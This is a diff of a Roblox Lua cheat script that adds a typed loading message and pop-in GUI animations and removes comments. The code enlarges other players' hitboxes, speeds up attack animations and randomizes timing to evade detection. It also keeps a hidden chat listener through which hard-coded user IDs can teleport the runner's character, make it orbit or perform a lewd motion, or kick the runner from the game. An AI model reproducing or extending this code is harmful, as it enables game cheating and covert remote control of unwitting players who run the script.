@@ -1,4 +1,4 @@
--- cr7meware hb and speedanim update 11/24/25 fk u
+-- cr7meware hb and speedanim update 11/26/25 fk u
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -29,25 +29,55 @@ local commandUserIds = {
 
 local commandListenerEnabled = true -- toggle this to disable hidden listener when you want to stay low profile
 
--- ===== LOADING SCREEN (small & unobtrusive) =====
-local loadingGui = Instance.new("ScreenGui", PlayerGui)
-loadingGui.Name = "LoadingScreen"
+-- ===== COOL TEXT LOADING SCREEN (even spacing, letter fade) =====
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "CR7ME_Loading"
 loadingGui.ResetOnSpawn = false
+loadingGui.IgnoreGuiInset = true
+loadingGui.Parent = PlayerGui
 
-local loadingLabel = Instance.new("TextLabel", loadingGui)
-loadingLabel.Size = UDim2.new(0, 200, 0, 20)
-loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingLabel.Position = UDim2.new(0.5, 0.5, 0.5, -10)
-loadingLabel.BackgroundTransparency = 1
-loadingLabel.Text = "Made by cr7me"
-loadingLabel.TextColor3 = Color3.new(1, 1, 1)
-loadingLabel.Font = Enum.Font.GothamSemibold
-loadingLabel.TextSize = 12
-loadingLabel.TextStrokeTransparency = 0.6
+local fullText = "SCRIPT STILL INTESTING SO EXPECT BUGS"
 
-task.delay(2, function()
-    if loadingGui then pcall(function() loadingGui:Destroy() end) end
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 600, 0, 40)
+container.AnchorPoint = Vector2.new(0.5, 0.5)
+container.Position = UDim2.new(0.5, 0, 0.5, 0)
+container.BackgroundTransparency = 1
+container.Parent = loadingGui
+
+local baseLabel = Instance.new("TextLabel")
+baseLabel.Size = UDim2.new(1, 0, 1, 0)
+baseLabel.BackgroundTransparency = 1
+baseLabel.Font = Enum.Font.GothamSemibold
+baseLabel.TextSize = 22
+baseLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+baseLabel.TextStrokeTransparency = 0.7
+baseLabel.TextXAlignment = Enum.TextXAlignment.Center
+baseLabel.TextYAlignment = Enum.TextYAlignment.Center
+baseLabel.Parent = container
+
+baseLabel.Text = string.rep(" ", #fullText)
+
+for i = 1, #fullText do
+    local shown = fullText:sub(1, i)
+    local hidden = string.rep(" ", #fullText - i)
+    baseLabel.Text = shown .. hidden
+    task.wait(0.05)
+end
+
+task.wait(2)
+
+for i = 1, #fullText do
+    local hidden = string.rep(" ", i)
+    local shown = fullText:sub(i + 1)
+    baseLabel.Text = shown .. hidden
+    task.wait(0.05)
+end
+
+pcall(function()
+    loadingGui:Destroy()
 end)
+-- ===== END LOADING SCREEN =====
 
 -- ===== SAVE ORIGINAL LIGHTING SETTINGS =====
 local originalLighting = {
@@ -77,12 +107,12 @@ screenGui.ResetOnSpawn = false
 
 local frame = Instance.new("Frame", screenGui)
 frame.Size = UDim2.new(0, 280, 0, 250)
-frame.Position = UDim2.new(0.5, -140, 0.5, -125) -- centered
+frame.Position = UDim2.new(0.5, -140, 0.5, -125)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
 frame.Active = true
 frame.Draggable = true
-frame.Visible = guiVisible
+frame.Visible = false -- start hidden for pop animation
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 12)
 
@@ -97,7 +127,6 @@ title.TextColor3 = Color3.new(1, 1, 1)
 title.BackgroundTransparency = 1
 title.TextXAlignment = Enum.TextXAlignment.Center
 
--- GUI Toggle Button (top right of screen - for mobile access, draggable)
 local guiToggleBtn = Instance.new("TextButton", screenGui)
 guiToggleBtn.Size = UDim2.new(0, 50, 0, 50)
 guiToggleBtn.Position = UDim2.new(1, -60, 0, 10)
@@ -119,7 +148,6 @@ guiToggleBtn.MouseButton1Click:Connect(function()
     frame.Visible = guiVisible
 end)
 
--- Tab creation helper
 local function createTabButton(name, pos)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0, 80, 0, 26)
@@ -135,11 +163,59 @@ local function createTabButton(name, pos)
     return btn
 end
 
+-- Create tabs (we'll animate them after)
 local tabMain = createTabButton("Main", UDim2.new(0, 10, 0, 35))
 local tabHitbox = createTabButton("Hitbox", UDim2.new(0, 95, 0, 35))
 local tabExtra = createTabButton("Extra", UDim2.new(0, 180, 0, 35))
 
--- Page container helper
+-- Save their original positions and start them scaled in Y to 0 (flat)
+local tabButtons = {tabMain, tabHitbox, tabExtra}
+for _, btn in ipairs(tabButtons) do
+    btn.Visible = false
+end
+
+-- Pop‑in animation: tiny pixel -> full panel + tab slide‑in
+task.spawn(function()
+    task.wait(0.05)
+    frame.Visible = true
+    local originalSize = frame.Size
+    local originalPos = frame.Position
+
+    frame.Size = UDim2.new(0, 2, 0, 2)
+    frame.Position = UDim2.new(
+        originalPos.X.Scale,
+        originalPos.X.Offset + originalSize.X.Offset / 2 - 1,
+        originalPos.Y.Scale,
+        originalPos.Y.Offset + originalSize.Y.Offset / 2 - 1
+    )
+
+    local tweenFrame = TweenService:Create(
+        frame,
+        TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {
+            Size = originalSize,
+            Position = originalPos
+        }
+    )
+    tweenFrame:Play()
+    tweenFrame.Completed:Wait()
+
+    -- Animate tab buttons: scale Y from 0 to 1 (using size)
+    for i, btn in ipairs(tabButtons) do
+        btn.Visible = true
+        local originalBtnSize = btn.Size
+        btn.Size = UDim2.new(originalBtnSize.X.Scale, originalBtnSize.X.Offset, 0, 0)
+
+        local tweenBtn = TweenService:Create(
+            btn,
+            TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { Size = originalBtnSize }
+        )
+        tweenBtn:Play()
+        task.wait(0.04) -- small stagger between each tab anim
+    end
+end)
+
 local function createPage()
     local page = Instance.new("Frame")
     page.Size = UDim2.new(1, -20, 1, -70)
@@ -166,7 +242,6 @@ tabMain.MouseButton1Click:Connect(function() switchTab(pageMain) end)
 tabHitbox.MouseButton1Click:Connect(function() switchTab(pageHitbox) end)
 tabExtra.MouseButton1Click:Connect(function() switchTab(pageExtra) end)
 
--- Widget helpers
 local function makeButton(parent, text, pos)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0, 240, 0, 26)
@@ -250,12 +325,11 @@ local function makeToggle(parent, labelText, pos, initialState, callback)
 end
 
 -- ===== MAIN TAB CONTENT =====
--- Speed notifier: rectangular bubble behind text (changes color), black text
 local statusContainer = Instance.new("Frame", pageMain)
 statusContainer.Size = UDim2.new(0, 240, 0, 28)
 statusContainer.AnchorPoint = Vector2.new(0.5, 0)
 statusContainer.Position = UDim2.new(0.5, 0, 0, 0)
-statusContainer.BackgroundColor3 = Color3.fromRGB(200, 0, 0) -- red by default
+statusContainer.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
 local statusCorner = Instance.new("UICorner", statusContainer)
 statusCorner.CornerRadius = UDim.new(0, 6)
 
@@ -266,7 +340,7 @@ statusLabel.BackgroundTransparency = 1
 statusLabel.Text = "Punch Speed: Disabled"
 statusLabel.Font = Enum.Font.Gotham
 statusLabel.TextSize = 13
-statusLabel.TextColor3 = Color3.fromRGB(0,0,0) -- black text
+statusLabel.TextColor3 = Color3.fromRGB(0,0,0)
 statusLabel.TextXAlignment = Enum.TextXAlignment.Center
 statusLabel.TextYAlignment = Enum.TextYAlignment.Center
 
@@ -277,7 +351,6 @@ local decreaseButton = makeButton(pageMain, "Decrease Speed", UDim2.new(0, 0, 0,
 local speedBox = makeTextbox(pageMain, "Enter Speed", tostring(speedMultiplier), UDim2.new(0, 0, 0, 152))
 
 local isAnimating = false
-local animLoopThread = nil
 
 local function updateStatusBubble(enabled)
     if enabled then
@@ -294,7 +367,7 @@ onButton.MouseButton1Click:Connect(function()
     updateStatusBubble(true)
     if not isAnimating then
         isAnimating = true
-        animLoopThread = coroutine.wrap(function()
+        coroutine.wrap(function()
             while isAnimating do
                 local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                 if hum then
@@ -302,10 +375,9 @@ onButton.MouseButton1Click:Connect(function()
                         pcall(function() anim:AdjustSpeed(speedMultiplier) end)
                     end
                 end
-                task.wait(0.12 + math.random() * 0.08) -- small variable delay
+                task.wait(0.12 + math.random() * 0.08)
             end
-        end)
-        animLoopThread()
+        end)()
     end
 end)
 
@@ -346,12 +418,6 @@ local hitboxToggleFrame, hitboxToggleBtn = makeToggle(pageHitbox, "Enable Hitbox
 end)
 
 -- ===== SAFER HITBOX FUNCTIONS =====
--- Approach:
--- * Avoid directly altering other players' HumanoidRootPart physics in ways that cause flings.
--- * Clamp local player's velocity while hitbox is enabled so *you* don't get flung.
--- * On other players, set HRP.CanCollide = false and attempt to set HumanoidRootPart.Transparency; attempt to zero velocities when players enter ragdoll/get up.
--- Note: server authoritativeness varies between games; this is a client-side easing approach.
-
 local localClampConnection = nil
 local ragdollListeners = {}
 
@@ -363,8 +429,7 @@ function safeSetHRPProps(hrp, size, transparency)
         hrp.CanCollide = false
         hrp.BrickColor = BrickColor.new("Really black")
         hrp.Material = Enum.Material.ForceField
-        -- Try to reduce physical push impact
-        local success, _ = pcall(function()
+        pcall(function()
             if hrp.AssemblyLinearVelocity then
                 hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
             end
@@ -376,17 +441,14 @@ function applyHitboxes()
     local size = tonumber(hitboxSizeBox.Text) or defaultHitboxSize
     local transparency = tonumber(transparencyBox.Text) or hitboxTransparency
 
-    -- For other players: adjust HRP appearance & make non-collidable (client-side)
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
             if teamCheck and plr.Team == player.Team then
-                -- skip same team
             else
                 local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                 if hrp then
                     pcall(function()
                         safeSetHRPProps(hrp, size, transparency)
-                        -- connect to Humanoid state changes to try to zero velocities when they get up
                         local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                         if hum and not ragdollListeners[plr] then
                             ragdollListeners[plr] = hum.StateChanged:Connect(function(old, new)
@@ -405,16 +467,13 @@ function applyHitboxes()
         end
     end
 
-    -- Clamp local player's HRP so YOU don't get flung when someone else moves
     if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
         local hrpLocal = player.Character.HumanoidRootPart
         if localClampConnection then localClampConnection:Disconnect() localClampConnection = nil end
         localClampConnection = RunService.Stepped:Connect(function()
             if hitboxEnabled and hrpLocal and hrpLocal:IsDescendantOf(workspace) then
-                -- gently damp velocity to keep you grounded
                 pcall(function()
                     local v = hrpLocal.AssemblyLinearVelocity
-                    -- allow small lateral movement but clamp large vertical impulses
                     local clamped = Vector3.new(v.X * 0.9, math.clamp(v.Y, -6, 6), v.Z * 0.9)
                     hrpLocal.AssemblyLinearVelocity = clamped
                 end)
@@ -424,7 +483,6 @@ function applyHitboxes()
 end
 
 function resetHitboxes()
-    -- Revert players' HRP visuals locally and disconnect ragdoll listeners
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
             pcall(function()
@@ -444,12 +502,11 @@ function resetHitboxes()
         end
     end
     if localClampConnection then
-        pcall(function() localClampConnection:Disconnect() end)
+        pcall(function() localClampConnection:Disconnect() end) 
         localClampConnection = nil
     end
 end
 
--- Apply immediately if toggled
 hitboxSizeBox.FocusLost:Connect(function()
     if hitboxEnabled then applyHitboxes() end
 end)
@@ -457,15 +514,12 @@ transparencyBox.FocusLost:Connect(function()
     if hitboxEnabled then applyHitboxes() end
 end)
 
--- lightweight periodic checker to maintain hitbox behavior without aggressive per-frame changes
 local hitboxMaintenance = RunService.Heartbeat:Connect(function(dt)
     if hitboxEnabled then
-        -- only occasionally re-apply to avoid spam and server attention
         if math.random() < 0.12 then
             pcall(function() applyHitboxes() end)
         end
     else
-        -- ensure reset if previously active
         if math.random() < 0.04 then
             pcall(function() resetHitboxes() end)
         end
@@ -494,7 +548,6 @@ end)
 local fpsButton = makeButton(pageExtra, "Toggle FPS Boost", UDim2.new(0, 0, 0, 30))
 fpsButton.MouseButton1Click:Connect(function()
     if not isFPSBoosted then
-        -- Aggressive lighting optimizations
         Lighting.GlobalShadows = false
         Lighting.Brightness = 0
         Lighting.FogEnd = 1e10
@@ -508,13 +561,11 @@ fpsButton.MouseButton1Click:Connect(function()
         Lighting.EnvironmentDiffuseScale = 0
         Lighting.EnvironmentSpecularScale = 0
         
-        -- Graphics quality reduction
         pcall(function()
             settings().Rendering.QualityLevel = 1
             settings().Rendering.FrameRateManager = 2
         end)
         
-        -- Disable particles and effects
         for _, descendant in pairs(workspace:GetDescendants()) do
             pcall(function()
                 if descendant:IsA("ParticleEmitter") then
@@ -529,7 +580,6 @@ fpsButton.MouseButton1Click:Connect(function()
             end)
         end
         
-        -- Monitor and disable new particles
         workspace.DescendantAdded:Connect(function(descendant)
             if isFPSBoosted then
                 pcall(function()
@@ -543,7 +593,6 @@ fpsButton.MouseButton1Click:Connect(function()
         isFPSBoosted = true
         fpsButton.Text = "Restore Graphics"
     else
-        -- Restore original settings
         Lighting.Brightness = originalLighting.Brightness
         Lighting.FogEnd = originalLighting.FogEnd
         Lighting.GlobalShadows = originalLighting.GlobalShadows
@@ -587,9 +636,6 @@ keybindBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- Command listener is always enabled (removed toggle)
-
--- ===== KEYBIND TOGGLE GUI =====
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == guiToggleKey then
@@ -598,15 +644,12 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
--- ===== DISPLAY NAME MODIFICATION FOR COMMAND USERS =====
 local function updateCommandUserDisplayName(plr)
     if not plr or not plr.Character then return end
     local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
     if humanoid then
         pcall(function()
-            -- Get the player's current display name (not username)
             local currentDisplayName = humanoid.DisplayName
-            -- Only add emoji if it's not already there
             if not currentDisplayName:find("🛠") then
                 humanoid.DisplayName = "(🛠)" .. currentDisplayName
             end
@@ -614,7 +657,6 @@ local function updateCommandUserDisplayName(plr)
     end
 end
 
--- Apply display name to existing command users
 for _, plr in pairs(Players:GetPlayers()) do
     if commandUserIds[plr.UserId] then
         plr.CharacterAdded:Connect(function()
@@ -628,7 +670,6 @@ for _, plr in pairs(Players:GetPlayers()) do
     end
 end
 
--- Apply display name to new command users
 Players.PlayerAdded:Connect(function(plr)
     if commandUserIds[plr.UserId] then
         plr.CharacterAdded:Connect(function()
@@ -638,12 +679,10 @@ Players.PlayerAdded:Connect(function(plr)
     end
 end)
 
--- ===== Utilities: small randomized wait to mimic natural timing =====
 local function humanWait(minT, maxT)
     task.wait((minT or 0.05) + math.random() * ((maxT or 0.12)))
 end
 
--- ===== Smooth movement using TweenService (safer than instant CFrame) =====
 local function smoothMoveTo(hrp, targetCFrame, duration)
     if not hrp or not hrp:IsDescendantOf(workspace) then return end
     local info = TweenInfo.new(math.clamp(duration or 0.25, 0.06, 1.2), Enum.EasingStyle.Linear)
@@ -652,7 +691,6 @@ local function smoothMoveTo(hrp, targetCFrame, duration)
     end)
     if success and tween then
         tween:Play()
-        -- Wait slightly for tween to begin, but not block too long
         local done = false
         tween.Completed:Connect(function() done = true end)
         local t0 = tick()
@@ -660,12 +698,10 @@ local function smoothMoveTo(hrp, targetCFrame, duration)
             task.wait(0.02)
         end
     else
-        -- fallback: short direct set (rare)
         pcall(function() hrp.CFrame = targetCFrame end)
     end
 end
 
--- ===== COMMAND LISTENER LOGIC (hidden, toggleable) =====
 local lastCommand = ""
 local previousCommands = {}
 local isOrbiting = false
@@ -683,7 +719,6 @@ local function addCommand(cmd)
     if #previousCommands > 6 then
         table.remove(previousCommands)
     end
-    -- intentionally no visible GUI part for command logs (hidden)
 end
 
 local function getHRP(plr)
@@ -691,17 +726,14 @@ local function getHRP(plr)
     return char and char:FindFirstChild("HumanoidRootPart")
 end
 
--- safer teleport helper using tween & small random delay
 local function safeMoveLocalTo(targetCFrame)
     local hrp = getHRP(player)
     if not hrp then return end
-    -- small human-like delay and randomized duration
     humanWait(0.04, 0.18)
     local dur = 0.12 + math.random() * 0.18
     pcall(function() smoothMoveTo(hrp, targetCFrame, dur) end)
 end
 
--- Teleport/Move to player (uses tween)
 local function teleportTo(target)
     if not target then return end
     local targetHRP = getHRP(target)
@@ -714,7 +746,6 @@ local function teleportTo(target)
     end
 end
 
--- Orbit: use a tweened small step each heartbeat to be smoother and less "teleporty"
 local orbitData = {enabled = false, angle = 0, radius = 5, speed = math.pi}
 local function orbitPlayer(target)
     if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
@@ -732,20 +763,18 @@ local function orbitPlayer(target)
             orbitData.angle = orbitData.angle + orbitData.speed * dt * (0.6 + math.random() * 0.8)
             local offset = Vector3.new(math.cos(orbitData.angle) * orbitData.radius, 0, math.sin(orbitData.angle) * orbitData.radius)
             local dest = targetHRP.CFrame * CFrame.new(offset)
-            -- tween a tiny step to dest; shorter duration so it follows smoothly
             pcall(function() smoothMoveTo(hrp, dest, 0.08 + math.random() * 0.06) end)
         end
     end)
 end
 
--- Stand floating: follow target but remain grounded more safely (slightly above)
 local function standFloating(target)
     if standConnection then standConnection:Disconnect() standConnection = nil end
     standConnection = RunService.Heartbeat:Connect(function(dt)
         local hrp = getHRP(player)
         local targetHRP = getHRP(target)
         if hrp and targetHRP then
-            local dest = targetHRP.CFrame * CFrame.new(-1.5, 1.5, 2) -- smaller vertical offset to avoid being flung
+            local dest = targetHRP.CFrame * CFrame.new(-1.5, 1.5, 2)
             pcall(function() smoothMoveTo(hrp, dest, 0.08) end)
         end
     end)
@@ -756,13 +785,11 @@ local function hideInSky()
     isHiding = true
     local hrp = getHRP(player)
     if hrp then
-        -- move to a high Y position but use tween & keep human-like timing
         safeMoveLocalTo(CFrame.new(0, 200, 0))
     end
     addCommand("Hiding in the air")
 end
 
--- Punch: use tool activation but add small randomized delay to mimic player
 local function punch()
     local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
     if tool then
@@ -777,7 +804,6 @@ local function freezePlayer()
     isFrozen = not isFrozen
     if isFrozen then
         local hrp = getHRP(player)
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
         if hrp then
             freezeConnection = RunService.Stepped:Connect(function()
                 if isFrozen and hrp and hrp:IsDescendantOf(workspace) then
@@ -811,7 +837,7 @@ local function benxPlayer(target)
     end
     addCommand("Started benx")
     local benxDirection = 1
-    local benxOffset = -1.5 -- Start closer
+    local benxOffset = -1.5
     benxConnection = RunService.Heartbeat:Connect(function(dt)
         if not isBenxing then return end
         local hrp = getHRP(player)
@@ -823,7 +849,6 @@ local function benxPlayer(target)
             elseif benxOffset < -2.5 then
                 benxDirection = 1
             end
-            -- Position in front of target, moving forward and backward (Z axis)
             local dest = targetHRP.CFrame * CFrame.new(0, 0, benxOffset)
             pcall(function() smoothMoveTo(hrp, dest, 0.05) end)
         end
@@ -843,7 +868,6 @@ local function stopAll()
     end
     if benxConnection then benxConnection:Disconnect() benxConnection = nil end
     if isHiding then
-        -- if hiding, move back to a safe nearby position near any command user (if present)
         for id in pairs(commandUserIds) do
             local cmdPlr = Players:GetPlayerByUserId(id)
             if cmdPlr and cmdPlr.Character and cmdPlr.Character:FindFirstChild("HumanoidRootPart") then
@@ -859,7 +883,6 @@ local function stopAll()
     addCommand("Stopped all")
 end
 
--- Add cooldown to avoid command spam
 local lastCommandTime = 0
 local commandCooldown = 0.8
 
@@ -869,7 +892,6 @@ local function handleCommand(cmd)
     end
     lastCommandTime = tick()
 
-    -- try to pick a target player among the command user ids (prefer online)
     local targetPlayer = nil
     for id in pairs(commandUserIds) do
         local p = Players:GetPlayerByUserId(id)
@@ -906,7 +928,6 @@ local function handleCommand(cmd)
     elseif cmd == "!stop" then
         stopAll()
     elseif cmd == "!kick" then
-        -- kicking yourself out is intrusive — keep but add small delay
         humanWait(0.05, 0.22)
         pcall(function() player:Kick("kicked by cr7me") end)
     elseif cmd == "!rejoin" then
@@ -917,11 +938,9 @@ local function handleCommand(cmd)
     end
 end
 
--- Monitor chat UI (silent) but only if listener enabled
 local function monitorChatUI()
     if not commandListenerEnabled then return end
     local list
-    -- attempt to find the default UI container "Main" -> "List" (roblox chat UI variants or custom UIs)
     local tries = 0
     while not list and tries < 40 and commandListenerEnabled do
         local mainGui = PlayerGui:FindFirstChild("Main")
@@ -961,19 +980,13 @@ local function monitorChatUI()
     end
 end
 
--- Command listener always enabled
 spawn(monitorChatUI)
 
--- Make sure the hidden listener respects changes to the toggle variable
--- (If user toggles via boolean in-game or UI, we start/stop accordingly.)
-
--- Good measure: detect if player character gets added — reapply local safeguards if hitbox is on
 player.CharacterAdded:Connect(function(char)
     task.wait(0.8)
     if hitboxEnabled then applyHitboxes() end
 end)
 
--- Clean up on script destroy (attempt)
 screenGui.AncestryChanged:Connect(function()
     if not screenGui:IsDescendantOf(game) then
         resetHitboxes()
@@ -985,4 +998,4 @@ screenGui.AncestryChanged:Connect(function()
     end
 end)
 
--- End of script
+-- End of script.
